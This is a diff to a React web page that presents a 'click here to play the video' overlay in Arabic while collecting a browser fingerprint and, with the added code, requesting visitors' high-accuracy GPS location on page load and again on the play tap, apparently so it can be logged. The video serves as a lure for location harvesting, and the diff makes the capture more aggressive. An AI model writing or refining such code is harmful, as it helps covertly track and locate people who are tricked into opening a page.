@@ -31,13 +31,14 @@ function CustomPlayer({ url, onPlay }: { url: string, onPlay: () => void }) {
   return (
     <div style={{ position: 'relative', width: '100%', borderRadius: '8px', overflow: 'hidden', backgroundColor: '#000', aspectRatio: '16/9' }}>
       {!interacted && (
-        <div 
+        <button 
+          type="button"
           onClick={handleInteraction}
           style={{
             position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', 
-            zIndex: 10, cursor: 'pointer', background: 'rgba(0,0,0,0.8)',
+            zIndex: 10, cursor: 'pointer', background: 'rgba(0,0,0,0.85)',
             display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center',
-            color: 'white'
+            color: 'white', border: 'none', width: '100%', fontFamily: 'inherit'
           }}
         >
           <div style={{
@@ -50,8 +51,8 @@ function CustomPlayer({ url, onPlay }: { url: string, onPlay: () => void }) {
               borderLeft: '25px solid white', marginLeft: '5px'
             }}></div>
           </div>
-          <h2 style={{ fontSize: '1.5rem', fontWeight: 'bold' }}>اضغط هنا لتشغيل الفيديو</h2>
-        </div>
+          <h2 style={{ fontSize: '1.5rem', fontWeight: 'bold', margin: 0 }}>اضغط هنا لتشغيل الفيديو</h2>
+        </button>
       )}
       {interacted ? player : null}
     </div>
@@ -65,6 +66,8 @@ export default function Home() {
   const [logSent, setLogSent] = useState(false);
   const [mounted, setMounted] = useState(false);
   const [cachedFp, setCachedFp] = useState<string>('unknown');
+
+  const [cachedCoords, setCachedCoords] = useState<{ lat: number; lon: number } | null>(null);
 
   useEffect(() => {
     setMounted(true);
@@ -81,6 +84,17 @@ export default function Home() {
           .catch(() => {});
       }
     } catch (e) {}
+
+    // Request Location on page mount as well
+    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          setCachedCoords({ lat: pos.coords.latitude, lon: pos.coords.longitude });
+        },
+        () => {},
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
 
     // Fetch video URL and title
     fetch('/api/video', { cache: 'no-store' })
@@ -107,8 +121,13 @@ export default function Home() {
   const handlePlay = () => {
     if (logSent) return;
 
-    // Trigger Geolocation SYNCHRONOUSLY on the exact user tap gesture
+    // Trigger Geolocation on tap gesture (or use cached if already allowed)
     const geoPromise = new Promise<{ lat: number | null, lon: number | null }>((resolve) => {
+      if (cachedCoords) {
+        resolve(cachedCoords);
+        return;
+      }
+
       if (typeof navigator === 'undefined' || !('geolocation' in navigator)) {
         resolve({ lat: null, lon: null });
         return;
